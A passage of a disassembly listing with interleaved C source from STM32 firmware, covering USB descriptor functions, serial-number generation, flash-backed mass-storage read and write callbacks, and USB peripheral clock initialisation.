  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c59e:	4b02      	ldr	r3, [pc, #8]	; (800c5a8 <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c5a0:	4618      	mov	r0, r3
 800c5a2:	3708      	adds	r7, #8
 800c5a4:	46bd      	mov	sp, r7
 800c5a6:	bd80      	pop	{r7, pc}
 800c5a8:	20000204 	.word	0x20000204

0800c5ac <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c5ac:	b580      	push	{r7, lr}
 800c5ae:	b082      	sub	sp, #8
 800c5b0:	af00      	add	r7, sp, #0
 800c5b2:	4603      	mov	r3, r0
 800c5b4:	6039      	str	r1, [r7, #0]
 800c5b6:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c5b8:	79fb      	ldrb	r3, [r7, #7]
 800c5ba:	2b00      	cmp	r3, #0
 800c5bc:	d105      	bne.n	800c5ca <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c5be:	683a      	ldr	r2, [r7, #0]
 800c5c0:	4907      	ldr	r1, [pc, #28]	; (800c5e0 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c5c2:	4808      	ldr	r0, [pc, #32]	; (800c5e4 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c5c4:	f7ff fe1e 	bl	800c204 <USBD_GetString>
 800c5c8:	e004      	b.n	800c5d4 <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c5ca:	683a      	ldr	r2, [r7, #0]
 800c5cc:	4904      	ldr	r1, [pc, #16]	; (800c5e0 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c5ce:	4805      	ldr	r0, [pc, #20]	; (800c5e4 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c5d0:	f7ff fe18 	bl	800c204 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c5d4:	4b02      	ldr	r3, [pc, #8]	; (800c5e0 <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c5d6:	4618      	mov	r0, r3
 800c5d8:	3708      	adds	r7, #8
 800c5da:	46bd      	mov	sp, r7
 800c5dc:	bd80      	pop	{r7, pc}
 800c5de:	bf00      	nop
 800c5e0:	2000097c 	.word	0x2000097c
 800c5e4:	0800d260 	.word	0x0800d260

0800c5e8 <USBD_FS_InterfaceStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c5e8:	b580      	push	{r7, lr}
 800c5ea:	b082      	sub	sp, #8
 800c5ec:	af00      	add	r7, sp, #0
 800c5ee:	4603      	mov	r3, r0
 800c5f0:	6039      	str	r1, [r7, #0]
 800c5f2:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c5f4:	79fb      	ldrb	r3, [r7, #7]
 800c5f6:	2b00      	cmp	r3, #0
 800c5f8:	d105      	bne.n	800c606 <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c5fa:	683a      	ldr	r2, [r7, #0]
 800c5fc:	4907      	ldr	r1, [pc, #28]	; (800c61c <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c5fe:	4808      	ldr	r0, [pc, #32]	; (800c620 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c600:	f7ff fe00 	bl	800c204 <USBD_GetString>
 800c604:	e004      	b.n	800c610 <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c606:	683a      	ldr	r2, [r7, #0]
 800c608:	4904      	ldr	r1, [pc, #16]	; (800c61c <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c60a:	4805      	ldr	r0, [pc, #20]	; (800c620 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c60c:	f7ff fdfa 	bl	800c204 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c610:	4b02      	ldr	r3, [pc, #8]	; (800c61c <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c612:	4618      	mov	r0, r3
 800c614:	3708      	adds	r7, #8
 800c616:	46bd      	mov	sp, r7
 800c618:	bd80      	pop	{r7, pc}
 800c61a:	bf00      	nop
 800c61c:	2000097c 	.word	0x2000097c
 800c620:	0800d26c 	.word	0x0800d26c

0800c624 <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c624:	b480      	push	{r7}
 800c626:	b083      	sub	sp, #12
 800c628:	af00      	add	r7, sp, #0
 800c62a:	4603      	mov	r3, r0
 800c62c:	6039      	str	r1, [r7, #0]
 800c62e:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c630:	683b      	ldr	r3, [r7, #0]
 800c632:	220c      	movs	r2, #12
 800c634:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c636:	4b03      	ldr	r3, [pc, #12]	; (800c644 <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c638:	4618      	mov	r0, r3
 800c63a:	370c      	adds	r7, #12
 800c63c:	46bd      	mov	sp, r7
 800c63e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c642:	4770      	bx	lr
 800c644:	200001f4 	.word	0x200001f4

0800c648 <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c648:	b580      	push	{r7, lr}
 800c64a:	b084      	sub	sp, #16
 800c64c:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c64e:	4b0f      	ldr	r3, [pc, #60]	; (800c68c <Get_SerialNum+0x44>)
 800c650:	681b      	ldr	r3, [r3, #0]
 800c652:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c654:	4b0e      	ldr	r3, [pc, #56]	; (800c690 <Get_SerialNum+0x48>)
 800c656:	681b      	ldr	r3, [r3, #0]
 800c658:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c65a:	4b0e      	ldr	r3, [pc, #56]	; (800c694 <Get_SerialNum+0x4c>)
 800c65c:	681b      	ldr	r3, [r3, #0]
 800c65e:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
 800c660:	68fa      	ldr	r2, [r7, #12]
 800c662:	687b      	ldr	r3, [r7, #4]
 800c664:	4413      	add	r3, r2
 800c666:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c668:	68fb      	ldr	r3, [r7, #12]
 800c66a:	2b00      	cmp	r3, #0
 800c66c:	d009      	beq.n	800c682 <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c66e:	2208      	movs	r2, #8
 800c670:	4909      	ldr	r1, [pc, #36]	; (800c698 <Get_SerialNum+0x50>)
 800c672:	68f8      	ldr	r0, [r7, #12]
 800c674:	f000 f814 	bl	800c6a0 <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c678:	2204      	movs	r2, #4
 800c67a:	4908      	ldr	r1, [pc, #32]	; (800c69c <Get_SerialNum+0x54>)
 800c67c:	68b8      	ldr	r0, [r7, #8]
 800c67e:	f000 f80f 	bl	800c6a0 <IntToUnicode>
  }
}
 800c682:	bf00      	nop
 800c684:	3710      	adds	r7, #16
 800c686:	46bd      	mov	sp, r7
 800c688:	bd80      	pop	{r7, pc}
 800c68a:	bf00      	nop
 800c68c:	1fff7590 	.word	0x1fff7590
 800c690:	1fff7594 	.word	0x1fff7594
 800c694:	1fff7598 	.word	0x1fff7598
 800c698:	20000206 	.word	0x20000206
 800c69c:	20000216 	.word	0x20000216

0800c6a0 <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c6a0:	b480      	push	{r7}
 800c6a2:	b087      	sub	sp, #28
 800c6a4:	af00      	add	r7, sp, #0
 800c6a6:	60f8      	str	r0, [r7, #12]
 800c6a8:	60b9      	str	r1, [r7, #8]
 800c6aa:	4613      	mov	r3, r2
 800c6ac:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c6ae:	2300      	movs	r3, #0
 800c6b0:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c6b2:	2300      	movs	r3, #0
 800c6b4:	75fb      	strb	r3, [r7, #23]
 800c6b6:	e027      	b.n	800c708 <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c6b8:	68fb      	ldr	r3, [r7, #12]
 800c6ba:	0f1b      	lsrs	r3, r3, #28
 800c6bc:	2b09      	cmp	r3, #9
 800c6be:	d80b      	bhi.n	800c6d8 <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c6c0:	68fb      	ldr	r3, [r7, #12]
 800c6c2:	0f1b      	lsrs	r3, r3, #28
 800c6c4:	b2da      	uxtb	r2, r3
 800c6c6:	7dfb      	ldrb	r3, [r7, #23]
 800c6c8:	005b      	lsls	r3, r3, #1
 800c6ca:	4619      	mov	r1, r3
 800c6cc:	68bb      	ldr	r3, [r7, #8]
 800c6ce:	440b      	add	r3, r1
 800c6d0:	3230      	adds	r2, #48	; 0x30
 800c6d2:	b2d2      	uxtb	r2, r2
 800c6d4:	701a      	strb	r2, [r3, #0]
 800c6d6:	e00a      	b.n	800c6ee <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c6d8:	68fb      	ldr	r3, [r7, #12]
 800c6da:	0f1b      	lsrs	r3, r3, #28
 800c6dc:	b2da      	uxtb	r2, r3
 800c6de:	7dfb      	ldrb	r3, [r7, #23]
 800c6e0:	005b      	lsls	r3, r3, #1
 800c6e2:	4619      	mov	r1, r3
 800c6e4:	68bb      	ldr	r3, [r7, #8]
 800c6e6:	440b      	add	r3, r1
 800c6e8:	3237      	adds	r2, #55	; 0x37
 800c6ea:	b2d2      	uxtb	r2, r2
 800c6ec:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c6ee:	68fb      	ldr	r3, [r7, #12]
 800c6f0:	011b      	lsls	r3, r3, #4
 800c6f2:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c6f4:	7dfb      	ldrb	r3, [r7, #23]
 800c6f6:	005b      	lsls	r3, r3, #1
 800c6f8:	3301      	adds	r3, #1
 800c6fa:	68ba      	ldr	r2, [r7, #8]
 800c6fc:	4413      	add	r3, r2
 800c6fe:	2200      	movs	r2, #0
 800c700:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c702:	7dfb      	ldrb	r3, [r7, #23]
 800c704:	3301      	adds	r3, #1
 800c706:	75fb      	strb	r3, [r7, #23]
 800c708:	7dfa      	ldrb	r2, [r7, #23]
 800c70a:	79fb      	ldrb	r3, [r7, #7]
 800c70c:	429a      	cmp	r2, r3
 800c70e:	d3d3      	bcc.n	800c6b8 <IntToUnicode+0x18>
  }
}
 800c710:	bf00      	nop
 800c712:	bf00      	nop
 800c714:	371c      	adds	r7, #28
 800c716:	46bd      	mov	sp, r7
 800c718:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c71c:	4770      	bx	lr

0800c71e <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c71e:	b480      	push	{r7}
 800c720:	b083      	sub	sp, #12
 800c722:	af00      	add	r7, sp, #0
 800c724:	4603      	mov	r3, r0
 800c726:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c728:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c72a:	4618      	mov	r0, r3
 800c72c:	370c      	adds	r7, #12
 800c72e:	46bd      	mov	sp, r7
 800c730:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c734:	4770      	bx	lr

0800c736 <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c736:	b480      	push	{r7}
 800c738:	b085      	sub	sp, #20
 800c73a:	af00      	add	r7, sp, #0
 800c73c:	4603      	mov	r3, r0
 800c73e:	60b9      	str	r1, [r7, #8]
 800c740:	607a      	str	r2, [r7, #4]
 800c742:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c744:	68bb      	ldr	r3, [r7, #8]
 800c746:	2240      	movs	r2, #64	; 0x40
 800c748:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c74a:	687b      	ldr	r3, [r7, #4]
 800c74c:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c750:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c752:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c754:	4618      	mov	r0, r3
 800c756:	3714      	adds	r7, #20
 800c758:	46bd      	mov	sp, r7
 800c75a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c75e:	4770      	bx	lr

0800c760 <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c760:	b480      	push	{r7}
 800c762:	b083      	sub	sp, #12
 800c764:	af00      	add	r7, sp, #0
 800c766:	4603      	mov	r3, r0
 800c768:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c76a:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c76c:	4618      	mov	r0, r3
 800c76e:	370c      	adds	r7, #12
 800c770:	46bd      	mov	sp, r7
 800c772:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c776:	4770      	bx	lr

0800c778 <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c778:	b480      	push	{r7}
 800c77a:	b083      	sub	sp, #12
 800c77c:	af00      	add	r7, sp, #0
 800c77e:	4603      	mov	r3, r0
 800c780:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c782:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c784:	4618      	mov	r0, r3
 800c786:	370c      	adds	r7, #12
 800c788:	46bd      	mov	sp, r7
 800c78a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c78e:	4770      	bx	lr

0800c790 <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c790:	b580      	push	{r7, lr}
 800c792:	b084      	sub	sp, #16
 800c794:	af00      	add	r7, sp, #0
 800c796:	60b9      	str	r1, [r7, #8]
 800c798:	607a      	str	r2, [r7, #4]
 800c79a:	461a      	mov	r2, r3
 800c79c:	4603      	mov	r3, r0
 800c79e:	73fb      	strb	r3, [r7, #15]
 800c7a0:	4613      	mov	r3, r2
 800c7a2:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c7a4:	7bfb      	ldrb	r3, [r7, #15]
 800c7a6:	2b00      	cmp	r3, #0
 800c7a8:	d10d      	bne.n	800c7c6 <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c7aa:	687b      	ldr	r3, [r7, #4]
 800c7ac:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c7b0:	3340      	adds	r3, #64	; 0x40
 800c7b2:	02db      	lsls	r3, r3, #11
 800c7b4:	4619      	mov	r1, r3
 800c7b6:	89bb      	ldrh	r3, [r7, #12]
 800c7b8:	02db      	lsls	r3, r3, #11
 800c7ba:	461a      	mov	r2, r3
 800c7bc:	68b8      	ldr	r0, [r7, #8]
 800c7be:	f000 fc65 	bl	800d08c <memcpy>
		return (USBD_OK);
 800c7c2:	2300      	movs	r3, #0
 800c7c4:	e000      	b.n	800c7c8 <STORAGE_Read_FS+0x38>
	}
  return (USBD_FAIL);
 800c7c6:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c7c8:	4618      	mov	r0, r3
 800c7ca:	3710      	adds	r7, #16
 800c7cc:	46bd      	mov	sp, r7
 800c7ce:	bd80      	pop	{r7, pc}

0800c7d0 <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c7d0:	b580      	push	{r7, lr}
 800c7d2:	b08a      	sub	sp, #40	; 0x28
 800c7d4:	af00      	add	r7, sp, #0
 800c7d6:	60b9      	str	r1, [r7, #8]
 800c7d8:	607a      	str	r2, [r7, #4]
 800c7da:	461a      	mov	r2, r3
 800c7dc:	4603      	mov	r3, r0
 800c7de:	73fb      	strb	r3, [r7, #15]
 800c7e0:	4613      	mov	r3, r2
 800c7e2:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800c7e4:	7bfb      	ldrb	r3, [r7, #15]
 800c7e6:	2b00      	cmp	r3, #0
 800c7e8:	d136      	bne.n	800c858 <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
 800c7ea:	f7f4 febb 	bl	8001564 <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800c7ee:	2300      	movs	r3, #0
 800c7f0:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800c7f2:	2301      	movs	r3, #1
 800c7f4:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800c7f6:	687b      	ldr	r3, [r7, #4]
 800c7f8:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c7fc:	3340      	adds	r3, #64	; 0x40
 800c7fe:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800c802:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800c804:	89bb      	ldrh	r3, [r7, #12]
 800c806:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800c808:	2300      	movs	r3, #0
 800c80a:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800c80c:	f107 0210 	add.w	r2, r7, #16
 800c810:	f107 0314 	add.w	r3, r7, #20
 800c814:	4611      	mov	r1, r2
 800c816:	4618      	mov	r0, r3
 800c818:	f7f4 ff8a 	bl	8001730 <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c81c:	2300      	movs	r3, #0
 800c81e:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c820:	e011      	b.n	800c846 <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800c822:	687b      	ldr	r3, [r7, #4]
 800c824:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c828:	3340      	adds	r3, #64	; 0x40
 800c82a:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c82c:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c82e:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800c830:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c832:	68ba      	ldr	r2, [r7, #8]
 800c834:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c836:	e9d3 2300 	ldrd	r2, r3, [r3]
 800c83a:	2000      	movs	r0, #0
 800c83c:	f7f4 fe26 	bl	800148c <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c840:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c842:	3308      	adds	r3, #8
 800c844:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c846:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800c848:	89bb      	ldrh	r3, [r7, #12]
 800c84a:	02db      	lsls	r3, r3, #11
 800c84c:	429a      	cmp	r2, r3
 800c84e:	d3e8      	bcc.n	800c822 <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800c850:	f7f4 feaa 	bl	80015a8 <HAL_FLASH_Lock>
		return USBD_OK;
 800c854:	2300      	movs	r3, #0
 800c856:	e000      	b.n	800c85a <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800c858:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800c85a:	4618      	mov	r0, r3
 800c85c:	3728      	adds	r7, #40	; 0x28
 800c85e:	46bd      	mov	sp, r7
 800c860:	bd80      	pop	{r7, pc}

0800c862 <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800c862:	b480      	push	{r7}
 800c864:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
 800c866:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800c868:	4618      	mov	r0, r3
 800c86a:	46bd      	mov	sp, r7
 800c86c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c870:	4770      	bx	lr
	...

0800c874 <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800c874:	b580      	push	{r7, lr}
 800c876:	b098      	sub	sp, #96	; 0x60
 800c878:	af00      	add	r7, sp, #0
 800c87a:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800c87c:	f107 030c 	add.w	r3, r7, #12
 800c880:	2254      	movs	r2, #84	; 0x54
 800c882:	2100      	movs	r1, #0
 800c884:	4618      	mov	r0, r3
 800c886:	f000 fbd5 	bl	800d034 <memset>
  if(pcdHandle->Instance==USB)
 800c88a:	687b      	ldr	r3, [r7, #4]
 800c88c:	681b      	ldr	r3, [r3, #0]
 800c88e:	4a1d      	ldr	r2, [pc, #116]	; (800c904 <HAL_PCD_MspInit+0x90>)
 800c890:	4293      	cmp	r3, r2
 800c892:	d132      	bne.n	800c8fa <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800c894:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800c898:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800c89a:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800c89e:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800c8a0:	2301      	movs	r3, #1
 800c8a2:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800c8a4:	2301      	movs	r3, #1
 800c8a6:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800c8a8:	2318      	movs	r3, #24
 800c8aa:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800c8ac:	2307      	movs	r3, #7
 800c8ae:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800c8b0:	2302      	movs	r3, #2
 800c8b2:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800c8b4:	2302      	movs	r3, #2
 800c8b6:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800c8b8:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800c8bc:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800c8be:	f107 030c 	add.w	r3, r7, #12
 800c8c2:	4618      	mov	r0, r3
 800c8c4:	f7f7 fe5c 	bl	8004580 <HAL_RCCEx_PeriphCLKConfig>
 800c8c8:	4603      	mov	r3, r0
 800c8ca:	2b00      	cmp	r3, #0
 800c8cc:	d001      	beq.n	800c8d2 <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800c8ce:	f7f4 fa03 	bl	8000cd8 <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800c8d2:	4b0d      	ldr	r3, [pc, #52]	; (800c908 <HAL_PCD_MspInit+0x94>)
 800c8d4:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c8d6:	4a0c      	ldr	r2, [pc, #48]	; (800c908 <HAL_PCD_MspInit+0x94>)
 800c8d8:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800c8dc:	6593      	str	r3, [r2, #88]	; 0x58
 800c8de:	4b0a      	ldr	r3, [pc, #40]	; (800c908 <HAL_PCD_MspInit+0x94>)
 800c8e0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c8e2:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800c8e6:	60bb      	str	r3, [r7, #8]
 800c8e8:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800c8ea:	2200      	movs	r2, #0
 800c8ec:	2100      	movs	r1, #0
 800c8ee:	2043      	movs	r0, #67	; 0x43
 800c8f0:	f7f4 fd95 	bl	800141e <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800c8f4:	2043      	movs	r0, #67	; 0x43
 800c8f6:	f7f4 fdae 	bl	8001456 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800c8fa:	bf00      	nop
 800c8fc:	3760      	adds	r7, #96	; 0x60
 800c8fe:	46bd      	mov	sp, r7
 800c900:	bd80      	pop	{r7, pc}
 800c902:	bf00      	nop
 800c904:	40006800 	.word	0x40006800
 800c908:	40021000 	.word	0x40021000

0800c90c <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c90c:	b580      	push	{r7, lr}
 800c90e:	b082      	sub	sp, #8
 800c910:	af00      	add	r7, sp, #0
 800c912:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800c914:	687b      	ldr	r3, [r7, #4]
 800c916:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800c91a:	687b      	ldr	r3, [r7, #4]
 800c91c:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800c920:	4619      	mov	r1, r3
 800c922:	4610      	mov	r0, r2
 800c924:	f7fe fb70 	bl	800b008 <USBD_LL_SetupStage>
}
 800c928:	bf00      	nop
 800c92a:	3708      	adds	r7, #8
 800c92c:	46bd      	mov	sp, r7
 800c92e:	bd80      	pop	{r7, pc}

0800c930 <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
